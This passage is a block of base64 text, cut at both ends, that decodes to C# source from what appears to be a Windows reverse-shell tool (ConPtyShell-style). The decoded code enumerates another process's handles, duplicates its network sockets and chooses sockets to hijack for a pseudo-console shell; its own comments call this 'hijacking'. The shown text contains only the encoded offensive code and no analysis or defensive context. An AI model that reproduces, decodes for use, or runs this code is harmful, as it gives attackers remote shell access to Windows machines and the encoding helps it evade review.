NrZXRGcm9tSGFuZGxlKEludFB0ciBzb2NrZXRIYW5kbGUpCiAgICB7CiAgICAgICAgSW50UHRyIHJldFNvY2tldCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBkdXBsaWNhdGVkU29ja2V0ID0gSW50UHRyLlplcm87CiAgICAgICAgV1NBUFJPVE9DT0xfSU5GTyB3c2FQcm90b2NvbEluZm8gPSBuZXcgV1NBUFJPVE9DT0xfSU5GTygpOwogICAgICAgIGludCBzdGF0dXMgPSBXU0FEdXBsaWNhdGVTb2NrZXQoc29ja2V0SGFuZGxlLCBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsIHJlZiB3c2FQcm90b2NvbEluZm8pOwogICAgICAgIGlmIChzdGF0dXMgPT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIC8vIHdlIG5lZWQgYW4gb3ZlcmxhcHBlZCBzb2NrZXQgZm9yIHRoZSBjb25wdHkgcHJvY2VzcyBidXQgd2UgZG9uJ3QgbmVlZCB0byBzcGVjaWZ5IHRoZSBXU0FfRkxBR19PVkVSTEFQUEVEIGZsYWcgaGVyZSBiZWNhdXNlIGl0IHdpbGwgYmUgaWdub3JlZCAoYW5kIGF1dG9tYXRpY2FsbHkgc2V0KSBieSBXU0FTb2NrZXQoKSBmdW5jdGlvbiBpZiB3ZSBzZXQgdGhlIFdTQVBST1RPQ09MX0lORk8gc3RydWN0dXJlIGFuZCBpZiB0aGUgb3JpZ2luYWwgc29ja2V0IGhhcyBiZWVuIGNyZWF0ZWQgd2l0aCB0aGUgb3ZlcmxhcHBlZCBmbGFnLgogICAgICAgICAgICBkdXBsaWNhdGVkU29ja2V0ID0gV1NBU29ja2V0KHdzYVByb3RvY29sSW5mby5pQWRkcmVzc0ZhbWlseSwgd3NhUHJvdG9jb2xJbmZvLmlTb2NrZXRUeXBlLCB3c2FQcm90b2NvbEluZm8uaVByb3RvY29sLCByZWYgd3NhUHJvdG9jb2xJbmZvLCAwLCAwKTsKICAgICAgICAgICAgaWYgKGR1cGxpY2F0ZWRTb2NrZXQuVG9JbnQ2NCgpID4gMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0U29ja2V0ID0gZHVwbGljYXRlZFNvY2tldDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gcmV0U29ja2V0OwogICAgfQoKICAgIC8vaGVscGVyIG1ldGhvZCB3aXRoICJkeW5hbWljIiBidWZmZXIgYWxsb2NhdGlvbgogICAgcHVibGljIHN0YXRpYyBJbnRQdHIgTnRRdWVyeU9iamVjdER5bmFtaWMoSW50UHRyIGhhbmRsZSwgT0JKRUNUX0lORk9STUFUSU9OX0NMQVNTIGluZm9DbGFzcywgaW50IGluZm9MZW5ndGgpCiAgICB7CiAgICAgICAgaWYgKGluZm9MZW5ndGggPT0gMCkKICAgICAgICAgICAgaW5mb0xlbmd0aCA9IE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihpbnQpKTsKICAgICAgICBJbnRQdHIgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGluZm9MZW5ndGgpOwogICAgICAgIHVpbnQgcmVzdWx0OwogICAgICAgIHdoaWxlICh0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgcmVzdWx0ID0gKHVpbnQpTnRRdWVyeU9iamVjdChoYW5kbGUsIGluZm9DbGFzcywgaW5mb1B0ciwgKHVpbnQpaW5mb0xlbmd0aCwgcmVmIGluZm9MZW5ndGgpOwogICAgICAgICAgICBpZiAocmVzdWx0ID09IE5UU1RBVFVTX0lORk9MRU5HVEhNSVNNQVRDSCB8fCByZXN1bHQgPT0gTlRTVEFUVVNfQlVGRkVST1ZFUkZMT1cgfHwgcmVzdWx0ID09IE5UU1RBVFVTX0JVRkZFUlRPT1NNQUxMKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKGluZm9QdHIpOwogICAgICAgICAgICAgICAgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKChpbnQpaW5mb0xlbmd0aCk7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmIChyZXN1bHQgPT0gTlRTVEFUVVNfU1VDQ0VTUykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vdGhyb3cgbmV3IEV4Y2VwdGlvbigiVW5oYW5kbGVkIE50U3RhdHVzICIgKyByZXN1bHQpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHJlc3VsdCA9PSBOVFNUQVRVU19TVUNDRVNTKQogICAgICAgICAgICByZXR1cm4gaW5mb1B0cjsvL2Rvbid0IGZvcmdldCB0byBmcmVlIHRoZSBwb2ludGVyIHdpdGggTWFyc2hhbC5GcmVlSEdsb2JhbCBhZnRlciB5b3UncmUgZG9uZSB3aXRoIGl0CiAgICAgICAgZWxzZQogICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKGluZm9QdHIpOy8vZnJlZSBwb2ludGVyIHdoZW4gbm90IFN1Y2Nlc3NmdWwKICAgICAgICByZXR1cm4gSW50UHRyLlplcm87CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBMaXN0PEludFB0cj4gR2V0U29ja2V0c1RhcmdldFByb2Nlc3MoUHJvY2VzcyB0YXJnZXRQcm9jZXNzKQogICAgewogICAgICAgIE9CSkVDVF9OQU1FX0lORk9STUFUSU9OIG9iak5hbWVJbmZvOwogICAgICAgIGxvbmcgSGFuZGxlc0NvdW50ID0gMDsKICAgICAgICBJbnRQdHIgZHVwSGFuZGxlOwogICAgICAgIEludFB0ciBwdHJPYmplY3ROYW1lOwogICAgICAgIEludFB0ciBwdHJIYW5kbGVzSW5mbzsKICAgICAgICBJbnRQdHIgaFRhcmdldFByb2Nlc3M7CiAgICAgICAgc3RyaW5nIHN0ck9iamVjdE5hbWU7CiAgICAgICAgTGlzdDxJbnRQdHI+IHNvY2tldHNIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOwogICAgICAgIERlYWRsb2NrQ2hlY2tIZWxwZXIgZGVhZGxvY2tDaGVja0hlbHBlck9iaiA9IG5ldyBEZWFkbG9ja0NoZWNrSGVscGVyKCk7CiAgICAgICAgaFRhcmdldFByb2Nlc3MgPSBPcGVuUHJvY2VzcyhQUk9DRVNTX0RVUF9IQU5ETEUsIGZhbHNlLCB0YXJnZXRQcm9jZXNzLklkKTsKICAgICAgICBpZiAoaFRhcmdldFByb2Nlc3MgPT0gSW50UHRyLlplcm8pCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ2Fubm90IG9wZW4gdGFyZ2V0IHByb2Nlc3Mgd2l0aCBwaWQgIiArIHRhcmdldFByb2Nlc3MuSWQuVG9TdHJpbmcoKSArICIgZm9yIER1cGxpY2F0ZUhhbmRsZSBhY2Nlc3MiKTsKICAgICAgICAgICAgcmV0dXJuIHNvY2tldHNIYW5kbGVzOwogICAgICAgIH0KICAgICAgICBwdHJIYW5kbGVzSW5mbyA9IE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbkR5bmFtaWMoU3lzdGVtSGFuZGxlSW5mb3JtYXRpb24sIDApOwogICAgICAgIEhhbmRsZXNDb3VudCA9IE1hcnNoYWwuUmVhZEludFB0cihwdHJIYW5kbGVzSW5mbykuVG9JbnQ2NCgpOwogICAgICAgIC8vIGNyZWF0ZSBhIHBvaW50ZXIgYXQgdGhlIGJlZ2lubmluZyBvZiB0aGUgYWRkcmVzcyBvZiBTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk9bXQogICAgICAgIEludFB0ciBwdHJIYW5kbGVzSW5mb0N1cnJlbnQgPSBuZXcgSW50UHRyKHB0ckhhbmRsZXNJbmZvLlRvSW50NjQoKSArIEludFB0ci5TaXplKTsKICAgICAgICAvLyBnZXQgVHlwZUluZGV4IGZvciAiRmlsZSIgb2JqZWN0cywgbmVlZGVkIHRvIGZpbHRlciBvbmx5IHNvY2tldHMgb2JqZWN0cwogICAgICAgIGJ5dGUgVHlwZUluZGV4RmlsZU9iamVjdCA9IEdldFR5cGVJbmRleEJ5TmFtZSgiRmlsZSIpOwogICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgSGFuZGxlc0NvdW50OyBpKyspCiAgICAgICAgewogICAgICAgICAgICBTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk8gc3lzSGFuZGxlOwogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc3lzSGFuZGxlID0gKFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTylNYXJzaGFsLlB0clRvU3RydWN0dXJlKHB0ckhhbmRsZXNJbmZvQ3VycmVudCwgdHlwZW9mKFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTykpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vbW92ZSBwb2ludGVyIHRvIG5leHQgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPCiAgICAgICAgICAgIHB0ckhhbmRsZXNJbmZvQ3VycmVudCA9IChJbnRQdHIpKHB0ckhhbmRsZXNJbmZvQ3VycmVudC5Ub0ludDY0KCkgKyBNYXJzaGFsLlNpemVPZih0eXBlb2YoU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPKSkpOwogICAgICAgICAgICBpZiAoc3lzSGFuZGxlLlVuaXF1ZVByb2Nlc3NJZCAhPSB0YXJnZXRQcm9jZXNzLklkIHx8IHN5c0hhbmRsZS5PYmplY3RUeXBlSW5kZXggIT0gVHlwZUluZGV4RmlsZU9iamVjdCkKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICBpZiAoRHVwbGljYXRlSGFuZGxlKGhUYXJnZXRQcm9jZXNzLCAoSW50UHRyKXN5c0hhbmRsZS5IYW5kbGVWYWx1ZSwgR2V0Q3VycmVudFByb2Nlc3MoKSwgb3V0IGR1cEhhbmRsZSwgMCwgZmFsc2UsIERVUExJQ0FURV9TQU1FX0FDQ0VTUykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmIChkZWFkbG9ja0NoZWNrSGVscGVyT2JqLkNoZWNrRGVhZGxvY2tEZXRlY3RlZChkdXBIYW5kbGUpKQogICAgICAgICAgICAgICAgeyAvLyB0aGlzIHdpbGwgYXZvaWRzIGRlYWRsb2NrcyBvbiBzcGVjaWFsIG5hbWVkIHBpcGUgaGFuZGxlcwogICAgICAgICAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogRGVhZGxvY2sgZGV0ZWN0ZWQiKTsKICAgICAgICAgICAgICAgICAgICBDbG9zZUhhbmRsZShkdXBIYW5kbGUpOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcHRyT2JqZWN0TmFtZSA9IE50UXVlcnlPYmplY3REeW5hbWljKGR1cEhhbmRsZSwgT0JKRUNUX0lORk9STUFUSU9OX0NMQVNTLk9iamVjdE5hbWVJbmZvcm1hdGlvbiwgMCk7CiAgICAgICAgICAgICAgICBpZiAocHRyT2JqZWN0TmFtZSA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDbG9zZUhhbmRsZShkdXBIYW5kbGUpOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgb2JqTmFtZUluZm8gPSAoT0JKRUNUX05BTUVfSU5GT1JNQVRJT04pTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHJPYmplY3ROYW1lLCB0eXBlb2YoT0JKRUNUX05BTUVfSU5GT1JNQVRJT04pKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ2xvc2VIYW5kbGUoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChvYmpOYW1lSW5mby5OYW1lLkJ1ZmZlciAhPSBJbnRQdHIuWmVybyAmJiBvYmpOYW1lSW5mby5OYW1lLkxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgc3RyT2JqZWN0TmFtZSA9IE1hcnNoYWwuUHRyVG9TdHJpbmdVbmkob2JqTmFtZUluZm8uTmFtZS5CdWZmZXIsIG9iak5hbWVJbmZvLk5hbWUuTGVuZ3RoIC8gMik7CiAgICAgICAgICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBmaWxlIGhhbmRsZSAweCIgKyBkdXBIYW5kbGUuVG9TdHJpbmcoIlg0IikgKyAiIHN0ck9iamVjdE5hbWUgPSAiICsgc3RyT2JqZWN0TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0ck9iamVjdE5hbWUgPT0gIlxcRGV2aWNlXFxBZmQiKQogICAgICAgICAgICAgICAgICAgICAgICBzb2NrZXRzSGFuZGxlcy5BZGQoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIENsb3NlSGFuZGxlKGR1cEhhbmRsZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgQ2xvc2VIYW5kbGUoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwocHRyT2JqZWN0TmFtZSk7CiAgICAgICAgICAgICAgICBwdHJPYmplY3ROYW1lID0gSW50UHRyLlplcm87CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChwdHJIYW5kbGVzSW5mbyk7CiAgICAgICAgTGlzdDxJbnRQdHI+IGR1cGVkU29ja2V0c0hhbmRsZXMgPSBEdXBsaWNhdGVTb2NrZXRzRnJvbUhhbmRsZXMoc29ja2V0c0hhbmRsZXMpOwogICAgICAgIGlmIChkdXBlZFNvY2tldHNIYW5kbGVzLkNvdW50ID49IDEpCiAgICAgICAgICAgIGR1cGVkU29ja2V0c0hhbmRsZXMgPSBGaWx0ZXJBbmRPcmRlclNvY2tldHNCeUJ5dGVzSW4oZHVwZWRTb2NrZXRzSGFuZGxlcyk7CiAgICAgICAgc29ja2V0c0hhbmRsZXMgPSBkdXBlZFNvY2tldHNIYW5kbGVzOwogICAgICAgIHJldHVybiBzb2NrZXRzSGFuZGxlczsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNTb2NrZXRJbmhlcml0ZWQoSW50UHRyIHNvY2tldEhhbmRsZSwgUHJvY2VzcyBwYXJlbnRQcm9jZXNzKQogICAgewogICAgICAgIGJvb2wgaW5oZXJpdGVkID0gZmFsc2U7CiAgICAgICAgTGlzdDxJbnRQdHI+IHBhcmVudFNvY2tldHNIYW5kbGVzID0gR2V0U29ja2V0c1RhcmdldFByb2Nlc3MocGFyZW50UHJvY2Vzcyk7CiAgICAgICAgaWYgKHBhcmVudFNvY2tldHNIYW5kbGVzLkNvdW50IDwgMSkKICAgICAgICAgICAgcmV0dXJuIGluaGVyaXRlZDsKICAgICAgICBmb3JlYWNoIChJbnRQdHIgcGFyZW50U29ja2V0SGFuZGxlIGluIHBhcmVudFNvY2tldHNIYW5kbGVzKQogICAgICAgIHsKICAgICAgICAgICAgU09DS0FERFJfSU4gc29ja2FkZHJUYXJnZXRQcm9jZXNzID0gbmV3IFNPQ0tBRERSX0lOKCk7CiAgICAgICAgICAgIFNPQ0tBRERSX0lOIHNvY2thZGRyUGFyZW50UHJvY2VzcyA9IG5ldyBTT0NLQUREUl9JTigpOwogICAgICAgICAgICBpbnQgc29ja2FkZHJUYXJnZXRQcm9jZXNzTGVuID0gTWFyc2hhbC5TaXplT2Yoc29ja2FkZHJUYXJnZXRQcm9jZXNzKTsKICAgICAgICAgICAgaW50IHNvY2thZGRyUGFyZW50UHJvY2Vzc0xlbiA9IE1hcnNoYWwuU2l6ZU9mKHNvY2thZGRyUGFyZW50UHJvY2Vzcyk7CiAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgIChnZXRwZWVybmFtZShzb2NrZXRIYW5kbGUsIHJlZiBzb2NrYWRkclRhcmdldFByb2Nlc3MsIHJlZiBzb2NrYWRkclRhcmdldFByb2Nlc3NMZW4pID09IDApICYmCiAgICAgICAgICAgICAgICAoZ2V0cGVlcm5hbWUocGFyZW50U29ja2V0SGFuZGxlLCByZWYgc29ja2FkZHJQYXJlbnRQcm9jZXNzLCByZWYgc29ja2FkZHJQYXJlbnRQcm9jZXNzTGVuKSA9PSAwKSAmJgogICAgICAgICAgICAgICAgKHNvY2thZGRyVGFyZ2V0UHJvY2Vzcy5zaW5fYWRkciA9PSBzb2NrYWRkclBhcmVudFByb2Nlc3Muc2luX2FkZHIgJiYgc29ja2FkZHJUYXJnZXRQcm9jZXNzLnNpbl9wb3J0ID09IHNvY2thZGRyUGFyZW50UHJvY2Vzcy5zaW5fcG9ydCkKICAgICAgICAgICAgICAgKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IGZvdW5kIGluaGVyaXRlZCBzb2NrZXQhIGhhbmRsZSAtLT4gMHgiICsgcGFyZW50U29ja2V0SGFuZGxlLlRvU3RyaW5nKCJYNCIpKTsKICAgICAgICAgICAgICAgIGluaGVyaXRlZCA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2xvc2Vzb2NrZXQocGFyZW50U29ja2V0SGFuZGxlKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGluaGVyaXRlZDsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNTb2NrZXRPdmVybGFwcGVkKEludFB0ciBzb2NrZXQpCiAgICB7CiAgICAgICAgYm9vbCByZXQgPSBmYWxzZTsKICAgICAgICBJbnRQdHIgc29ja0V2ZW50ID0gSW50UHRyLlplcm87CiAgICAgICAgaW50IG50U3RhdHVzID0gLTE7CiAgICAgICAgU09DS0VUX0NPTlRFWFQgY29udGV4dERhdGEgPSBuZXcgU09DS0VUX0NPTlRFWFQoKTsKICAgICAgICBudFN0YXR1cyA9IE50Q3JlYXRlRXZlbnQocmVmIHNvY2tFdmVudCwgRVZFTlRfQUxMX0FDQ0VTUywgSW50UHRyLlplcm8sIFN5bmNocm9uaXphdGlvbkV2ZW50LCBmYWxzZSk7CiAgICAgICAgaWYgKG50U3RhdHVzICE9IE5UU1RBVFVTX1NVQ0NFU1MpCiAgICAgICAgewogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IE50Q3JlYXRlRXZlbnQgZmFpbGVkIHdpdGggZXJyb3IgY29kZSAweCIgKyBudFN0YXR1cy5Ub1N0cmluZygiWDgiKSk7IDsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgSU9fU1RBVFVTX0JMT0NLIElPU0IgPSBuZXcgSU9fU1RBVFVTX0JMT0NLKCk7CiAgICAgICAgbnRTdGF0dXMgPSBOdERldmljZUlvQ29udHJvbEZpbGUxKHNvY2tldCwgc29ja0V2ZW50LCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIHJlZiBJT1NCLCBJT0NUTF9BRkRfR0VUX0NPTlRFWFQsIEludFB0ci5aZXJvLCAwLCByZWYgY29udGV4dERhdGEsIE1hcnNoYWwuU2l6ZU9mKGNvbnRleHREYXRhKSk7CiAgICAgICAgLy8gV2FpdCBmb3IgQ29tcGxldGlvbiAKICAgICAgICBpZiAobnRTdGF0dXMgPT0gTlRTVEFUVVNfUEVORElORykKICAgICAgICB7CiAgICAgICAgICAgIFdhaXRGb3JTaW5nbGVPYmplY3Qoc29ja0V2ZW50LCBJTkZJTklURSk7CiAgICAgICAgICAgIG50U3RhdHVzID0gSU9TQi5zdGF0dXM7CiAgICAgICAgfQogICAgICAgIENsb3NlSGFuZGxlKHNvY2tFdmVudCk7CgogICAgICAgIGlmIChudFN0YXR1cyAhPSBOVFNUQVRVU19TVUNDRVNTKQogICAgICAgIHsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBOdERldmljZUlvQ29udHJvbEZpbGUgZmFpbGVkIHdpdGggZXJyb3IgY29kZSAweCIgKyBudFN0YXR1cy5Ub1N0cmluZygiWDgiKSk7IDsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgaWYgKChjb250ZXh0RGF0YS5TaGFyZWREYXRhLkNyZWF0aW9uRmxhZ3MgJiBXU0FfRkxBR19PVkVSTEFQUEVEKSAhPSAwKSByZXQgPSB0cnVlOwogICAgICAgIHJldHVybiByZXQ7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBJbnRQdHIgRHVwbGljYXRlVGFyZ2V0UHJvY2Vzc1NvY2tldChQcm9jZXNzIHRhcmdldFByb2Nlc3MsIHJlZiBib29sIG92ZXJsYXBwZWRTb2NrZXQpCiAgICB7CiAgICAgICAgSW50UHRyIHRhcmdldFNvY2tldEhhbmRsZSA9IEludFB0ci5aZXJvOwogICAgICAgIExpc3Q8SW50UHRyPiB0YXJnZXRQcm9jZXNzU29ja2V0cyA9IEdldFNvY2tldHNUYXJnZXRQcm9jZXNzKHRhcmdldFByb2Nlc3MpOwogICAgICAgIGlmICh0YXJnZXRQcm9jZXNzU29ja2V0cy5Db3VudCA8IDEpIHJldHVybiB0YXJnZXRTb2NrZXRIYW5kbGU7CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgZm9yZWFjaCAoSW50UHRyIHNvY2tldEhhbmRsZSBpbiB0YXJnZXRQcm9jZXNzU29ja2V0cykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gd2UgcHJpb3JpdGl6ZSB0aGUgaGlqYWNraW5nIG9mIE92ZXJsYXBwZWQgc29ja2V0cwogICAgICAgICAgICAgICAgaWYgKCFJc1NvY2tldE92ZXJsYXBwZWQoc29ja2V0SGFuZGxlKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IEZvdW5kIGEgdXNhYmxlIHNvY2tldCwgYnV0IGl0IGhhcyBub3QgYmVlbiBjcmVhdGVkIHdpdGggdGhlIGZsYWcgV1NBX0ZMQUdfT1ZFUkxBUFBFRCwgc2tpcHBpbmcuLi4iKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHRhcmdldFNvY2tldEhhbmRsZSA9IHNvY2tldEhhbmRsZTsKICAgICAgICAgICAgICAgIG92ZXJsYXBwZWRTb2NrZXQgPSB0cnVlOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gbm8gT3ZlcmxhcHBlZCBzb2NrZXRzIGZvdW5kLCBleHBhbmRpbmcgdGhlIHNjb3BlIGJ5IGluY2x1ZGluZyBhbHNvIE5vbi1PdmVybGFwcGVkIHNvY2tldHMKICAgICAgICAgICAgaWYgKHRhcmdldFNvY2tldEhhbmRsZSA9PSBJbnRQdHIuWmVybykgewogICAgICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBObyBvdmVybGFwcGVkIHNvY2tldHMgZm91bmQuIFRyeWluZyB0byByZXR1cm4gYWxzbyBub24tb3ZlcmxhcHBlZCBzb2NrZXRzLi4uIik7CiAgICAgICAgICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29ja2V0SGFuZGxlIGluIHRhcmdldFByb2Nlc3NTb2NrZXRzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRhcmdldFNvY2tldEhhbmRsZSA9IHNvY2tldEhhbmRsZTsKICAgICAgICAgICAgICAgICAgICBpZiAoIUlzU29ja2V0T3ZlcmxhcHBlZCh0YXJnZXRTb2NrZXRIYW5kbGUpKSBvdmVybGFwcGVkU29ja2V0ID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHRhcmdldFNvY2tldEhhbmRsZSA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJObyBzb2NrZXRzIGZvdW5kLCBzbyBubyBoaWphY2thYmxlIHNvY2tldHMgOiggRXhpdGluZy4uLiIpOwogICAgICAgIHJldHVybiB0YXJnZXRTb2NrZXRIYW5kbGU7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgU2V0U29ja2V0QmxvY2tpbmdNb2RlKEludFB0ciBzb2NrZXQsIGludCBtb2RlKQogICAgewogICAgICAgIGludCBGSU9OQklPID0gLTIxNDcxOTUyNjY7CiAgICAgICAgaW50IE5vbkJsb2NraW5nTW9kZSA9IDE7CiAgICAgICAgaW50IEJsb2NraW5nTW9kZSA9IDA7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBpZiAobW9kZSA9PSAxKQogICAgICAgICAgICByZXN1bHQgPSBpb2N0bHNvY2tldChzb2NrZXQsIEZJT05CSU8sIHJlZiBOb25CbG9ja2luZ01vZGUpOwogICAgICAgIGVsc2UKICAgICAgICAgICAgcmVzdWx0ID0gaW9jdGxzb2NrZXQoc29ja2V0LCBGSU9OQklPLCByZWYgQmxvY2tpbmdNb2RlKTsKICAgICAgICBpZiAocmVzdWx0ID09IC0xKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oImlvY3Rsc29ja2V0IGZhaWxlZCB3aXRoIHJldHVybiBjb2RlICIgKyByZXN1bHQuVG9TdHJpbmcoKSArICIgYW5kIHdzYWxhc3RlcnJvcjogIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgfQp9CgovLyBzb3VyY2UgZnJvbSAtLT4gaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9hLzMzNDYwNTUKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IFBhcmVudFByb2Nlc3NVdGlsaXRpZXMKewogICAgLy8gVGhlc2UgbWVtYmVycyBtdXN0IG1hdGNoIFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04KICAgIGludGVybmFsIEludFB0ciBSZXNlcnZlZDE7CiAgICBpbnRlcm5hbCBJbnRQdHIgUGViQmFzZUFkZHJlc3M7CiAgICBpbnRlcm5hbCBJbnRQdHIgUmVzZXJ2ZWQyXzA7CiAgICBpbnRlcm5hbCBJbnRQdHIgUmVzZXJ2ZWQyXzE7CiAgICBpbnRlcm5hbCBJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOwogICAgaW50ZXJuYWwgSW50UHRyIEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoSW50UHRyIHByb2Nlc3NIYW5kbGUsIGludCBwcm9jZXNzSW5mb3JtYXRpb25DbGFzcywgcmVmIFBhcmVudFByb2Nlc3NVdGlsaXRpZXMgcHJvY2Vzc0luZm9ybWF0aW9uLCBpbnQgcHJvY2Vzc0luZm9ybWF0aW9uTGVuZ3RoLCBvdXQgaW50IHJldHVybkxlbmd0aCk7CgogICAgcHVibGljIHN0YXRpYyBQcm9jZXNzIEdldFBhcmVudFByb2Nlc3MoKQogICAgewogICAgICAgIHJldHVybiBHZXRQYXJlbnRQcm9jZXNzKFByb2Nlc3MuR2V0Q3VycmVudFByb2Nlc3MoKS5IYW5kbGUpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgUHJvY2VzcyBHZXRQYXJlbnRQcm9jZXNzKGludCBpZCkKICAgIHsKICAgICAgICBQcm9jZXNzIHByb2Nlc3MgPSBQcm9jZXNzLkdldFByb2Nlc3NCeUlkKGlkKTsKICAgICAgICByZXR1cm4gR2V0UGFyZW50UHJvY2Vzcyhwcm9jZXNzLkhhbmRsZSk7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBQcm9jZXNzIEdldFBhcmVudFByb2Nlc3MoSW50UHRyIGhhbmRsZSkKICAgIHsKICAgICAgICBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzIHBiaSA9IG5ldyBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzKCk7CiAgICAgICAgaW50IHJldHVybkxlbmd0aDsKICAgICAgICBpbnQgc3RhdHVzID0gTnRR